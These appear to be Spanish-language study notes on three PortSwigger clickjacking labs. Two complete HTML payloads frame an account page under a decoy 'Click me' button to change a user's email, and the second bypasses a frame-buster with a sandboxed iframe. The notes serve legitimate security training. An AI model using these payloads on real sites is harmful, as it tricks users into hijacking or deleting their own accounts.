
# Clickjacking básico con protección de token CSRF

Esta práctica de laboratorio contiene funciones de inicio de sesión y un botón para eliminar cuenta que está protegido por un token CSRF. Un usuario hará clic en elementos que muestran la palabra "hacer clic" en un sitio web señuelo.

Para resolver la práctica de laboratorio, cree algo de HTML que enmarque la página de la cuenta y engañe al usuario para que elimine su cuenta. El laboratorio se soluciona cuando se elimina la cuenta.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales:`wiener:peter`

El atacante carga una página web legítima dentro de un iframe (un marco embebido en otra página web) y luego coloca elementos visuales sobre ese iframe para engañar al usuario. Por ejemplo, el atacante puede colocar un botón "Cancelar" visible, pero en realidad, debajo de ese botón hay un botón "Confirmar compra" del sitio legítimo. Cuando el usuario hace clic en "Cancelar", está en realidad haciendo clic en "Confirmar compra".

![[Pasted image 20240618102818.png]]
![[Pasted image 20240618104240.png]]
![[Pasted image 20240618103900.png]]

# Clickjacking con datos de entrada de formulario precargados desde un parámetro de URL

Esta práctica de laboratorio amplía el ejemplo de clickjacking básico en [Laboratorio: Clickjacking básico con protección de token CSRF](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected) . El objetivo del laboratorio es cambiar la dirección de correo electrónico del usuario completando previamente un formulario usando un parámetro de URL e incitando al usuario a hacer clic sin darse cuenta en el botón "Actualizar correo electrónico".

Para resolver el laboratorio, cree algo de HTML que enmarque la página de la cuenta y engañe al usuario para que actualice su dirección de correo electrónico haciendo clic en el señuelo "Haz clic en mí". El laboratorio se soluciona cuando se cambia la dirección de correo electrónico.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales:`wiener:peter`

![[Pasted image 20240618161417.png]]
```
<!DOCTYPE html>
<html lang="en">
<body>
    <style>
        iframe {
            position:relative;
            width: 500px;
            height: 700px;
            opacity: 0.1;
            z-index: 2;
        }
        div {
            position:absolute;
            top: 440.5px;
            left: 45px;;
            z-index: 1;
        }
        button.buttom{
            border: none;
            user-select: none;
            background-color: #159c80;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            padding: 7px 1em;
            text-align: center;
            text-decoration: none !important;
            white-space: nowrap;
            min-width: 120px;
            border-radius: 25px;
        }
    </style>
    <div>
        <button class="buttom" type="submit">Click me</button>
    </div>
    <iframe src="https://0a8b006103ca2bcb83f5c33600a90017.web-security-academy.net/my-account?email=hacker@gmail.com"></iframe>    
</body>
</html>
```
![[Pasted image 20240618161647.png]]

# Clickjacking con un script de destrucción de fotogramas

Este laboratorio está protegido por un frame buster que evita que el sitio web se enmarque. ¿Puedes evitar el frame buster y realizar un [ataque de clickjacking](https://portswigger.net/web-security/clickjacking) que cambie la dirección de correo electrónico de los usuarios?

Para resolver la práctica de laboratorio, cree algo de HTML que enmarque la página de la cuenta y engañe al usuario para que cambie su dirección de correo electrónico haciendo clic en "Haga clic en mí". El laboratorio se soluciona cuando se cambia la dirección de correo electrónico.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales:`wiener:peter`

![[Pasted image 20240619102618.png]]

**`sandbox="allow-forms"`**: Este atributo agrega restricciones de seguridad al iframe. En este caso, solo se permite el envío de formularios desde dentro del iframe. Todas las demás acciones (como ejecutar scripts, abrir ventanas emergentes, etc.) están restringidas.

```
<!DOCTYPE html>
<html lang="en">
<body>
    <style>
        iframe {
            position:relative;
            width: 500px;
            height: 700px;
            opacity: 0.1;
            z-index: 2;
        }
        div {
            position:absolute;
            top: 440.5px;
            left: 45px;;
            z-index: 1;
        }
        button.buttom{
            border: none;
            user-select: none;
            background-color: #159c80;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            padding: 7px 1em;
            text-align: center;
            text-decoration: none !important;
            white-space: nowrap;
            min-width: 120px;
            border-radius: 25px;
        }
    </style>
    <div>
        <button class="buttom">Click me</button>
    </div>

    <iframe sandbox="allow-forms" src="https://0a8c004a04ac788e825dfb88003100fb.web-security-academy.net/my-account?email=hacker@gmail.com"></iframe>    
</body>
</html>
```
![[Pasted image 20240619102731.png]]

